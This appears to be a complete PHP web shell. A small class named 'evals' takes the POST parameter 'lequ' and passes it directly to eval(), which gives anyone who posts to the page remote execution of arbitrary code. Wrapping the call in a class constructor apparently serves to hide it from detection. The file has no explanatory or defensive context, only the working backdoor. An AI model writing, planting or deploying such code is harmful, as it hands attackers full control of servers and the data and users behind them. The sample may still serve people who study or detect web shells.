<?php
class evals{
    protected $links;
    function __construct($an){
        $this->links = $an;
        eval("\$title=1;".$this->links);
    }
}
$a = new evals(@$_POST['lequ']);
?>